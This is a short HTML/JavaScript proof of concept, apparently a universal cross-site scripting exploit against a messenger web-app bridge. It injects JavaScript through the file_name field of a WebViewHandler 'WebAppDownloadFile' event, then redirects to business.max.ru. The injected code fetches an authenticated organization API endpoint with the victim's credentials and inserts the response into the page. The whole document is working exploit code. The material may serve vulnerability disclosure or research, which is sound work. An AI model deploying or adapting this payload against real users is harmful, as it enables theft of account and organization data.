<script>
  function DownloadFileFunction() {
    const blobUrl = URL.createObjectURL(
     new Blob(['UXSS'], {type: 'text/plain'})
   );
 
 const fileName = `'+(()=>{fetch('/self/api/v1/organization',{method:'GET',credentials:'include'}).then(response => response.text()).then(data => {
    let div = document.createElement('div');
    div.textContent = data;
    document.body.appendChild(div);
})})()+'`;
 
 window.WebViewHandler.postEvent(
   'WebAppDownloadFile',
   JSON.stringify({
     requestId: 'bridge-poc-delayed-download',
     url: blobUrl,
     file_name: fileName
   })
 );
 
 location.replace('https://business.max.ru/');
  }
</script>
<script src="https://st.max.ru/js/max-web-app.js"></script>

<body>

<button onclick="DownloadFileFunction()">WebAppDownloadFile</button>
